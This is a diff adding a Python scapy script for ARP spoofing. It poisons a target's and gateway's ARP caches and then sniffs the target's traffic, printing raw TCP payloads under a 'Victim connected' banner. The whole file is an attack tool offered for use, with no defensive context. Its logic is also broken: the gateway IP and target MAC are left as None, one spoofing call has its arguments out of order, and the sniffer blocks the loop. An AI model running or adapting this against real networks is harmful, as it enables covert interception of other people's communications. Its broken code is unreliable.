@@ -1,0 +1,93 @@
+import scapy.all as scapy
+import time
+import sys
+import ipaddress
+
+def get_mac(ip):
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        response = scapy.sr1(arp_request, timeout=1, verbose=False)
+
+        if response and response.haslayer(scapy.Ether):
+            return response[scapy.Ether].src
+        else:
+            return None
+    except Exception as e:
+        print(f"Error getting MAC address: {str(e)}")
+        sys.exit(1)
+
+def spoofer(target_ip, target_mac, gateway_ip):
+    try:
+        if not target_mac:
+            target_mac = "ff:ff:ff:ff:ff:ff"
+
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        scapy.send(packet, verbose=False)
+    except Exception as e:
+        print(f"Error spoofing ARP: {str(e)}")
+
+def restore(target_ip, target_mac, gateway_ip):
+    try:
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=get_mac(gateway_ip))
+        scapy.send(packet, count=4, verbose=False)
+    except Exception as e:
+        print(f"Error restoring ARP: {str(e)}")
+
+def sniff_packets(target_ip):
+    try:
+        packet_filter = "ip and ( ip host " + target_ip + " )"
+        packets = scapy.sniff(filter=packet_filter, prn=process_packet, store=0)
+    except Exception as e:
+        print(f"Error sniffing packets: {str(e)}")
+
+def process_packet(packet):
+    try:
+        if packet.haslayer(scapy.IP):
+            source_ip = packet[scapy.IP].src
+            destination_ip = packet[scapy.IP].dst
+            protocol = packet[scapy.IP].proto
+
+            if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
+                source_port = packet[scapy.TCP].sport
+                destination_port = packet[scapy.TCP].dport
+                data = packet[scapy.Raw].load.decode('utf-8', 'ignore')
+
+                print(f"\n[+] Victim connected to {destination_ip}")
+                print(f"    Source IP: {source_ip}, Source Port: {source_port}")
+                print(f"    Destination IP: {destination_ip}, Destination Port: {destination_port}")
+                print(f"    Protocol: {protocol}")
+                print(f"    Data: {data}")
+
+    except Exception as e:
+        print(f"Error processing packet: {str(e)}")
+
+def get_user_input():
+    while True:
+        target_ip = input("Enter the target IP address: ")
+        try:
+            ipaddress.IPv4Address(target_ip)
+            return target_ip, None, None
+        except ValueError:
+            print("Invalid IP address. Please enter a valid IPv4 address.")
+
+try:
+    target_ip, target_mac, gateway_ip = get_user_input()
+    packets = 0
+    while True:
+        spoofer(target_ip, target_mac, gateway_ip)
+        spoofer(gateway_ip, target_ip, target_mac)
+        print("\r[+] Sent packets " + str(packets)),
+        sys.stdout.flush()
+        packets += 2
+        time.sleep(2)
+
+        # Show what the victim is browsing
+        sniff_packets(target_ip)
+
+except KeyboardInterrupt:
+    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
+    restore(target_ip, target_mac, gateway_ip)
+    restore(gateway_ip, target_ip, target_mac)
+except Exception as e:
+    print(f"Error: {str(e)}")
+    sys.exit(1)
